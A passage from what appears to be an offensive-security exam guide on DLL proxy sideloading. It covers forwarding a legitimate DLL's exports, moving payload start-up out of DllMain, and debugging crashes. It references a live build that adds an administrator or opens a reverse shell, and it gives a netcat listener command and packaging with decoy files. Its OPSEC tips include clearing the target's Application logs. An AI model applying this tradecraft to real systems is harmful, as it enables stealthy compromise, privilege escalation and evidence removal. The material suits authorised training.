- Confirmed the host loaded our DLL (ProcMon / `Load Image` hit, or Error Reporting points at our module).
- Assume “host + original DLL” alone runs normally (verify the stock pair on a clean VM first).

### Prepare (attacker side)
1. Locate the crash source in Event Viewer (target / replica VM):
   - Event Viewer → Windows Logs → Application → find Error / `Application Error` 1000, check **faulting module name**:
     - our `legit.dll` → our code / DllMain problem;
     - host or system DLL → not necessarily us (run stock pair as control first).
   - If the popup is “The procedure entry point `X` could not be located in ... `legit.dll`” → **missing export**; go to step 2.
2. Missing-export triage (most common):
   - What the host wants from us: `dumpbin /imports RunHost.exe`, find the `legit.dll` section.
   - What our Proxy actually exports: `dumpbin /exports legit.dll` (Windows) or `objdump -p legit.dll` (Kali).
   - Diff → regenerate `forward.def` (full original exports); **for ordinal-only exports the `.def` must keep `@N`**.
3. Calling convention / name triage:
   - If `dumpbin /exports original.dll` shows decorated names (`_Foo@8` / `Foo@8`), it is stdcall; hand-written implementations must be `__stdcall` with matching parameter byte counts (`@8` = two 4-byte args). **`.def` static forwarding skips this entirely** — preferred path.
   - On x86, cdecl export is `_Foo`, stdcall is `_Foo@N`; mixing them means “loads fine, crashes on first call.”
4. DllMain crash triage:
   - Rebuild/replace with `m04-proxy-dll-sideload.c` (no-payload pure forward): no crash → problem is payload init, not forwarding.
   - Reintroduce payload gradually: move DllMain work into a `CreateThread` function wrapped in SEH (`__try/__except`); never `LoadLibrary` / `WaitForSingleObject` / network I/O inside DllMain (loader lock → deadlock or exception).
5. Control: copy `original.dll` back to the original name `legit.dll` (remove our file) and run the host — if it still crashes, the problem is the host environment (missing VC runtime, etc.), unrelated to this module.

### Steps
1. On a replica VM, run “stock host + stock DLL” and confirm the baseline is healthy.
2. Drop the “no-payload Proxy”: healthy → forwarding OK; crash → return to prepare steps 2/3 for exports and calling conventions.
3. After no-payload passes, swap the live build (`m04-proxy-dll-newadmin.c`); if it crashes → payload trigger style: thread + SEH + delay; DllMain only does `CreateThread`.
4. Confirm in Event Viewer: faulting module no longer points at `legit.dll`; host stays alive; payload works.

### Scripts used
- `m04-proxy-dll-sideload.c` (isolation control: no-payload pure forward)
- `m04-proxy-dll-newadmin.c` (live build; note its DllMain only `CreateThread`s)
- `m04-proxy-dll-cpp.cpp` (.def / calling-convention notes + hand-written forward examples for a few functions)
- Toolchain: `dumpbin /exports|/imports|/headers`, `objdump -p`, ProcMon, Event Viewer.

### Verify
- Host process stays alive in Task Manager / `tasklist` for >30 seconds with a usable window.
- Event Viewer has no new `legit.dll` faulting records.
- Payload checks match scenario 11 (reverse received / new user in Administrators).
- Cross-check: build once for x64 and once for x86; confirm the packer’s architecture assertions match reality.

### Failure branches and alternatives
1. **Incomplete export forward; missing a function only used on a rare code path** → host looks fine until a specific button is clicked. Alt: blindly forward the full original DLL (entire objdump table into `.def`); do not hand-pick functions.
2. **Original DLL exports data (variables), not only functions** → export forwarding does not work for data exports (forwarding is for functions). Alt: that DLL is a poor Proxy candidate — pick another sideload point; or hand-implement and handle the data symbol (rare; confirm the real hit with ProcMon first).
3. **Ordinal-only exports (no names)** → write `Foo = original.Foo @N` in `.def` to keep ordinals; when the host imports by ordinal our export ordinals must match.
4. **Payload crashes immediately in DllMain; still crashes after moving to a thread** → payload itself is wrong (e.g. shellcode length/bitness): first verify the path with a harmless action (write a file / MessageBox), then swap the real payload; wrap with SEH so the host does not die with it.
5. **“Instant exit” is actually AV killing the process** → faulting module is `MsMpEng.exe` / a behavior engine: return to scenario 11 failure branch 4; do not waste time on Proxy forwarding.

### Exam notes / OPSEC
- **Isolate variables before changing code**: the no-payload control build is scenario 12’s first diagnostic tool — avoids leaving many samples while iterating on a live DLL.
- Event Viewer records every crash (including module path) — crash freely on the replica VM; on the target minimize crash count, clear Application logs after, or change payload shape.
- Blocking/deadlock in DllMain does not just crash — it can freeze the host where the user notices; stick to “DllMain only starts a thread.”
- Hand-written export implementations can leak toolchain info via mangled names; `.def` forwarding is cleanest — prefer it in the final package.

## 4. Appendix: command quick reference

```bash
# Kali — host / original DLL architecture
file RunHost.exe original.dll

# Kali — export table (source data for forward.def)
x86_64-w64-mingw32-objdump -p original.dll | sed -n '/Export Name Pointer Table/,/Ordinal Hint Table/p'

# Windows — exports / host imports / machine type
dumpbin /exports original.dll
dumpbin /imports RunHost.exe
dumpbin /headers RunHost.exe | findstr machine

# Pack (ZIP after architecture consistency checks)
python3 m04-build-sideload-package.py --input-dir ./sideload \
  --dll-name legit.dll --out sideload-pkg.zip

# Listener (reverse mode)
nc -lvnp LPORT
```

Directory layout, version/architecture assertions, and decoy files get a final consistency check inside `m04-build-sideload-package.py`; before delivery, confirm once more with ProcMon on a replica VM that “Load Image hits our legit.dll.”
